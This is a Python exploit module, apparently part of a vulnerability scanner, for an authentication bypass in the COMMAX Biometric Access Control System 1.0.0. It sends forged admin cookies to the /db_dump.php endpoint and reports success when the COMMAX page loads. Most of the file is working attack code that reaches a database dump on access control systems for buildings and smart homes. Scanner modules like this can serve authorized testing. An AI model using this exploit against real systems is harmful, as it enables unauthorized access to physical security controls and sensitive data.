import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''COMMAX Biometric Access Control System 1.0.0 - Authentication Bypass''',
        "description": '''The COMMAX Biometric Access Control System suffers from an authentication bypass vulnerability. An unauthenticated attacker through cookie poisoning can bypass authentication and disclose sensitive information and circumvent physical controls in smart homes and buildings.''',
        "severity": "critical",
        "references": [
            "https://www.exploit-db.com/exploits/50206", 
            "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2021-5661.php"
        ],
        "classification": {
            "cvss-metrics": "",
            "cvss-score": "",
            "cve-id": "",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["commax", "auth-bypass"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/db_dump.php"""
        method = "GET"
        data = """"""
        headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Cookie': 'CMX_SAVED_ID=zero; CMX_ADMIN_ID=science; CMX_ADMIN_NM=liquidworm; CMX_ADMIN_LV=9; CMX_COMPLEX_NM=ZSL; CMX_COMPLEX_IP=2.5.1.0'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if (resp0.status_code == 200) and ("""<title>::: COMMAX :::</title>""" in resp0.text) and ("""text/html""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url